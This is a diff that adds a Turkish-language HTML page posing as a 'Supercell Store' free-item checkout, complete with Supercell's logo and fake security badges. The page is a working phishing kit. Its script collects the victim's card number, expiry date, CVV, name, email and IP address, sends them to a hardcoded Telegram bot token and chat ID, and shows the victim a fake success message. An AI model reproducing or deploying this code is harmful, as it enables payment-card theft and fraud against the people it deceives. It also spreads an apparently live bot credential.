@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Supercell Store - Ücretsiz Ödeme</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .header img {
+            width: 70px;
+            height: 70px;
+            border-radius: 15px;
+            margin-bottom: 15px;
+            border: 2px solid #1E90FF;
+        }
+        
+        .header h2 {
+            color: #2C3E50;
+            margin-bottom: 5px;
+        }
+        
+        .header p {
+            color: #7F8C8D;
+            font-size: 14px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #2C3E50;
+            font-size: 14px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #E3F2FD;
+            border-radius: 10px;
+            font-size: 16px;
+            background: #F8FBFF;
+            transition: border 0.3s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #1E90FF;
+            background: white;
+        }
+        
+        .card-group {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .card-group div {
+            flex: 1;
+        }
+        
+        .amount-section {
+            background: linear-gradient(135deg, #E3F2FD, #BBDEFB);
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+            margin: 25px 0;
+            border: 2px dashed #1E90FF;
+        }
+        
+        .amount-label {
+            color: #2C3E50;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        
+        .amount {
+            color: #28a745;
+            font-size: 36px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .free-badge {
+            background: #28a745;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: bold;
+            display: inline-block;
+        }
+        
+        button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #28a745, #20c997);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        .security {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #7F8C8D;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+            color: #1E90FF;
+        }
+        
+        .status {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+        }
+        
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://accounts.supercell.com/static/appicons/store.png" alt="Supercell Store">
+            <h2>SUPERCELL STORE</h2>
+            <p>Ücretsiz Ödeme - store</p>
+        </div>
+        
+        <form id="paymentForm">
+            <div class="form-group">
+                <label for="cardHolder">Kart Sahibi:</label>
+                <input type="text" id="cardHolder" name="cardHolder" placeholder="Ad Soyad" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="cardNumber">Kart Numarası:</label>
+                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required>
+            </div>
+            
+            <div class="card-group">
+                <div class="form-group">
+                    <label for="expiryDate">Son Kullanma:</label>
+                    <input type="text" id="expiryDate" name="expiryDate" placeholder="AA/YY" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="cvv">CVV:</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" required>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="email">E-posta Adresi:</label>
+                <input type="email" id="email" name="email" placeholder="ornek@email.com" required>
+            </div>
+            
+            <div class="amount-section">
+                <div class="amount-label">TOPLAM TUTAR</div>
+                <div class="amount">₺0,00</div>
+                <div class="free-badge">ÜCRETSİZ</div>
+            </div>
+            
+            <button type="submit" id="submitBtn">
+                ÜCRETSİZ AL
+            </button>
+            
+            <div class="loading" id="loading">
+                ⏳ Telegram'a bildirim gönderiliyor...
+            </div>
+            
+            <div class="status" id="status"></div>
+        </form>
+        
+        <div class="security">
+            SSL Güvenli • 3D Secure • PCI DSS
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Bilgileri
+        const BOT_TOKEN = '7619144760:AAFgnQ9NIw4IR8SA-JNLk2upPe0LHvNMgKM';
+        const CHAT_ID = '5587800563';
+
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const paymentData = {
+                cardHolder: document.getElementById('cardHolder').value,
+                cardNumber: document.getElementById('cardNumber').value,
+                expiryDate: document.getElementById('expiryDate').value,
+                cvv: document.getElementById('cvv').value,
+                email: document.getElementById('email').value,
+                timestamp: new Date().toLocaleString('tr-TR'),
+                ip: await getIPAddress()
+            };
+            
+            await processPayment(paymentData);
+        });
+
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Bilinmiyor';
+            }
+        }
+
+        async function processPayment(paymentData) {
+            const btn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            const status = document.getElementById('status');
+            
+            // Yükleniyor göster
+            btn.disabled = true;
+            btn.innerHTML = 'İşleniyor...';
+            loading.style.display = 'block';
+            status.style.display = 'none';
+            
+            try {
+                // Telegram'a gönder
+                const telegramResult = await sendToTelegram(paymentData);
+                
+                if (telegramResult.success) {
+                    showStatus('✅ Başarılı! e posta bildirimi gönderildi. Ürün hesabınıza eklendi.', 'success');
+                } else {
+                    showStatus('⚠️ Ürün eklendi ama Telegram gönderilemedi: ' + telegramResult.error, 'error');
+                }
+                
+            } catch (error) {
+                showStatus('❌ Hata: ' + error.message, 'error');
+            } finally {
+                // Butonu eski haline getir
+                btn.disabled = false;
+                btn.innerHTML = 'ÜCRETSİZ AL';
+                loading.style.display = 'none';
+                
+                // Formu temizle
+                document.getElementById('paymentForm').reset();
+            }
+        }
+
+        async function sendToTelegram(paymentData) {
+            const message = `
+🎁 **YENİ ÜCRETSİZ ÖDEME**
+
+💳 **Kart Bilgileri:**
+👤 Kart Sahibi: ${paymentData.cardHolder}
+🔢 Kart No: ${paymentData.cardNumber}
+📅 Son Kullanma: ${paymentData.expiryDate}
+🔐 CVV: ${paymentData.cvv}
+
+📧 **İletişim:**
+📧 E-posta: ${paymentData.email}
+
+💰 **Ödeme Detayları:**
+💵 Tutar: ₺0,00 (ÜCRETSİZ)
+⏰ Zaman: ${paymentData.timestamp}
+🌐 IP: ${paymentData.ip}
+
+⚡ _Supercell Store Ücretsiz Ödeme_
+            `.trim();
+
+            try {
+                // Telegram Bot API'sine direkt istek
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.ok) {
+                    return { success: true, messageId: result.result.message_id };
+                } else {
+                    throw new Error(result.description || 'Telegram API hatası');
+                }
+
+            } catch (error) {
+                console.error('Telegram hatası:', error);
+                return { 
+                    success: false, 
+                    error: error.message 
+                };
+            }
+        }
+
+        function showStatus(message, type) {
+            const status = document.getElementById('status');
+            status.textContent = message;
+            status.className = 'status ' + type;
+            status.style.display = 'block';
+        }
+
+        // Input formatlama
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            if (value.length > 16) value = value.substr(0, 16);
+            e.target.value = value.replace(/(\d{4})/g, '$1 ').trim();
+        });
+
+        document.getElementById('expiryDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substr(0, 2) + '/' + value.substr(2, 2);
+            }
+            e.target.value = value;
+        });
+
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        document.getElementById('cardHolder').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/[^a-zA-ZğüşıöçĞÜŞİÖÇ\s]/g, '');
+        });
+
+        // Hata ayıklama
+        console.log('Telegram Bot Hazır:');
+        console.log('Bot Token:', BOT_TOKEN);
+        console.log('Chat ID:', CHAT_ID);
+    </script>
+</body>
+</html>
